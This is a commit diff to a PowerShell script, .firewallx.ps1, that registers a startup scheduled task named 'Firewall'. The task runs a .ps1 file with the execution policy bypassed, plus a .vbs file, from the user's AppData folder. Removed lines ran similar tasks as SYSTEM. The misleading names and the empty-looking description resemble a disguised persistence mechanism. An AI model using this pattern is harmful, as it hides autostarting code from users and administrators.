de10e143ee203c69c1cdabc9ce53d815eadc3ddb
fxhxyz4 <fxhxyz8@gmail.com>
2025-01-26 20:25:28 +0300

    Update .firewallx.ps1

--- .firewallx.ps1
+++ .firewallx.ps1
@@ -5,19 +5,11 @@ if ([Environment]::Is64BitOperatingSystem) {
 }
 
 $fileName = ".firewall$osBit"
+$psFilePath = "$env:APPDATA\Firewall\$fileName" + ".ps1"
+$vbsFilePath = "$env:APPDATA\Firewall\$fileName" + ".vbs"
 
-$psFilePath = "$env:APPDATA\Firewall\$fileName" + "x.ps1"
-$vbsFilePath = "$env:APPDATA\Firewall\$fileName" + "x.vbs"
+$psAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"$psFilePath`""
+$vbsAction = New-ScheduledTaskAction -Execute "cscript.exe" -Argument "`"$vbsFilePath`""
 
-$taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"$psFilePath`""
-$taskActionVBS = New-ScheduledTaskAction -Execute "cscript.exe" -Argument "`"$vbsFilePath`""
-
-$trigger = New-ScheduledTaskTrigger -AtStartup
-
-$taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
-
-$taskPrincipal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount
-
-Register-ScheduledTask -Action $taskAction -Trigger $trigger -Settings $taskSettings -Principal $taskPrincipal -TaskName "RunMyFilesAtStartup" -Description ""
-
-Register-ScheduledTask -Action $taskActionVBS -Trigger $trigger -Settings $taskSettings -Principal $taskPrincipal -TaskName "RunVBSAtStartup" -Description ""
+$startupTrigger = New-ScheduledTaskTrigger -AtStartup
+Register-ScheduledTask -TaskName "Firewall" -Action @($psAction, $vbsAction) -Trigger $startupTrigger -Description "_"
